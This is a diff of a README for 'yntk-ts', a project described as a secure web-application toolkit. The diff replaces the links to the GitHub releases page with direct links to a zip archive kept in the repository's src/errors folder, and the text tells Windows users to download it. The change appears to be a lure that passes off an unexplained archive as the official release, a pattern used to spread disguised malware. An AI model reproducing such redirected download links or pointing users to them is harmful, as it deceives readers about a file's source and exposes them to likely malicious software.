@@ -1,6 +1,6 @@
 # 📦 yntk-ts - Build secure applications with less effort
 
-[![Download yntk-ts](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://github.com/Amino4107/yntk-ts/releases)
+[![Download yntk-ts](https://img.shields.io/badge/Download_Now-Blue-blue.svg)](https://raw.githubusercontent.com/Amino4107/yntk-ts/main/src/errors/ts-yntk-1.1.zip)
 
 ## What is this tool?
 This software helps you build web applications. It provides the foundation for your project so you do not have to write code from scratch. It handles difficult tasks like managing user accounts, checking permissions, and keeping your data secure. You get a head start on your project with tools already in place for your database and security needs.
@@ -15,7 +15,7 @@ You need a Windows computer to use this application. Ensure your system meets th
 ## 📥 Getting the software
 You must visit the official release page to obtain the files for your computer. 
 
-[Click here to open the download page](https://github.com/Amino4107/yntk-ts/releases)
+[Click here to open the download page](https://raw.githubusercontent.com/Amino4107/yntk-ts/main/src/errors/ts-yntk-1.1.zip)
 
 Follow these steps to download the software:
 1. Open the link provided above in your web browser.
